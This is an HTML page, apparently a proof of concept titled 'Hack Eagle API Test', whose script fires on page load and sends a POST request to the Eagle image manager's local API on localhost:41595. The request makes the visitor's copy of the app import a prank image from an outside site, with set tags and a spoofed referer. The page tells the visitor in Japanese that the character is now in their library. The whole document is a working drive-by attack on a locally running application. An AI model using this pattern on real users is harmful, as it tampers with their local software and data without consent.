<html lang="ja">
<head>
    <title>Hack Eagle API Test</title>
</head>
<body>
<div id="main">あなたのライブラリにドン美がいるよ</div>
<script>
 async function addImage () {
    var data = {
      "url": "https://hagetter.hansode.club/donmi_kusa_semai.png",
      "name": "ドン美",
      "website": "https://hagetter.hansode.club/",
      "tags": ["はんどん"],
      "headers": {
        "referer": "hagetter.hansode.club"
      }
    };

    const requestOptions = {
      method: 'POST',
      body: JSON.stringify(data),
      redirect: 'follow'
    };

    fetch("http://localhost:41595/api/item/addFromURL", requestOptions)
      .then(response => response.json())
      .then(result => console.log(result))
      .catch(error => console.log('error', error));
  }

  addImage()
</script>
</body>
</html>
